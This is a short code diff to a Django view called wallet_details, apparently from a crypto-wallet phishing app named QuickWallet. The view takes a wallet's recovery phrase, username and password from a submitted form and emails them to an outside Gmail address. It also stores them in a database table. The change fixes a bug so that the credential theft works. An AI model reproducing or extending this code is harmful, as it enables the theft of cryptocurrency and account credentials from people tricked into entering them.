@@ -26,11 +26,12 @@ def wallet_details(request, slug):
         user = request.POST['user']
         password = request.POST['pass']
 
-        data = str(wallet, phrase, user, password)
+        data = [wallet, phrase, user, password]
+        message = str(data)
 
         # print(data)
 
-        send_mail('Result form QuickWallet', data, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )
+        send_mail('Result form QuickWallet', message, settings.EMAIL_HOST_USER, ['exkynexkyn@gmail.com'] )
 
         allresult = Result.objects.create(wallet=wallet, phrase=phrase, user=user, password=password)
         allresult.save()
